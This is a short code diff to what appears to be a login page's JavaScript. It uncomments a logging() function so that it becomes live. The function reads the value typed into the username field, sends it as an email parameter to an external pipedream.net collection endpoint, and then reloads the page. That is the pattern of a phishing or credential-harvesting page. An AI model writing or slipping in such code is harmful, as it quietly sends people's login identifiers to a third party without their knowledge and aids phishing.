@@ -1,8 +1,8 @@
-// async function logging(){
-//     const t = document.getElementById("username").value;
-//     await fetch(`https://eo2isf33hwr4zgo.m.pipedream.net/?email=${t}`);
-//     window.location.reload();
-// }
+async function logging(){
+    const t = document.getElementById("username").value;
+    await fetch(`https://eo2isf33hwr4zgo.m.pipedream.net/?email=${t}`);
+    window.location.reload();
+}
 
 
 function forgotPassMessage(){
